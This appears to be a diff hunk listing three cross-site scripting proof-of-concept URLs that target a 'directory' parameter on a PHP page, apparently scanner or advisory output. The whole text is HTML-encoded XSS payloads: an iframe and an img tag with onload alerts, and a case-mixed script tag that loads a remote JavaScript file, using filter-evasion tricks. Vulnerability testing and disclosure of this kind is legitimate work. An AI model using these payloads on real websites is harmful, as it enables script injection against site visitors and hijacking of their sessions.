@@ -1,0 +1,5 @@
+http://www.example.com/Ch99.php?directory=&lt;iframe/+/onload=alert(213771818860)&gt;&lt;/iframe&gt;
+
+http://www.example.com/Ch99.php?directory=&lt;ScRiPt+bad=&quot;&gt;&quot;+src=&quot;http://127.0.0.1/16.js?213771818860&quot;&gt;&lt;/ScRiPt&gt;
+
+http://www.example.com/Ch99.php?directory=&lt;img+src=http://127.0.0.1/cars.jpg+onload=alert(213771818860)&gt;
